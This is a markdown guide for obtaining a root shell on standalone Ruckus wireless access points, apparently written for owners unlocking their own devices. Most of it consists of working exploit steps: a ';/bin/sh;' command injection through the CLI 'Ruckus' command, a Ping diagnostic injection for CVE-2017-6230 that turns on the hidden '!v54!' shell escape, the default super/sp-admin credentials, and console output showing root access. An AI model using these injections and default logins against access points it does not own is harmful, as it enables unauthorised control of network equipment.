# Obtaining a root shell on Standalone/Solo Ruckus APs

The Ruckus CLI includes a hidden `!v54!` command which exits to a root shell.  

* Very old AP firmware checks a configuration setting `cli_esc2shell_ok` to decide whether the `!v54!` command is available.  
* Newer AP firmware checks an encrypted serial# to decide whether the `!v54!` command is available.  
The encrypted serial# is saved to a file using the `Ruckus` command, then the `!v54!` command uses `sesame` to decrypt this file.

## Firmware >112.1

Sorry, I don't have a method to bypass the serial# check on newer Standalone/Solo AP firmwares.  

If your AP was released before mid-2019 then you can downgrade to an older Solo firmware. If there are no older Solo firmwares, but your AP model was supported in ZoneDirector before this date (e.g. R730) then you can download the ZoneDirector release, [decrypt the image](ZDecryptRuckusBackups.md), extract the relevant ZoneDirector AP image (e.g. using 7-Zip) and temporarily install this.

For the R730, the [ZoneDirector 10.1.2.0.120](https://support.ruckuswireless.com/software/1970-zd1200-10-1-2-0-210-mr2-refresh1-software-release) firmware contains a suitable AP image at ```firmwares/ap-patch/patch000/ap-arm-11ax/10.1.2.0.120/rcks_fw.bl7.main```.

Alternatively, if your AP has Unleashed firmware available then you can install and use this to [obtain a root shell](UnleashedAddRootShell.md).

## Firmware 9.8 - 112.0 (excl. 110.0.0.0.2005)

These AP firmware versions [don't sanitize the encrypted serial#](https://alephsecurity.com/vulns/aleph-2019014#proof-of-concept).  
So we can use the `Ruckus` command to inject a root shell.
> Note that the injection only needs to be performed once.

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc
```

Login. Default username is "super", password is "sp-admin".

### Command injection

```console
rkscli: Ruckus
```

Now type `";/bin/sh;"` and hit enter *(you won't be able to see what you're typing)*

```console
grrrr
```

> Instead of `grrrr`, any other random dog noise could  be printed to the screen. 

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
BusyBox v1.15.2 (2015-07-21 22:07:19 PDT) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#
```

You have a root shell.

## Firmware Pre-9.8

These AP firmware versions [don't sanitize the input to the Ping diagnostic tool](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6230).  
So we can use `Ping` to enable `cli_esc2shell_ok`.
> Note that the `Ping` enablement only needs to be performed once.

### Connect to the AP's Web UI

Login. Default username is "super", password is "sp-admin".

### Enable shell escape

Go to `Administration` > `Diagnostics`, paste `|rpm${IFS}-p${IFS}cli_esc2shell_ok="t"` into the `Ping:` textbox & hit `Run test`.

### SSH to the AP

```console
$ ssh 192.168.0.1 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc
```

Login. Default username is "super", password is "sp-admin".

### Escape to shell

```console
rkscli: !v54!
What's your chow: 
```

Now hit enter

```console
BusyBox v1.15.2 (2015-07-21 22:07:19 PDT) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#
```

You have a root shell.
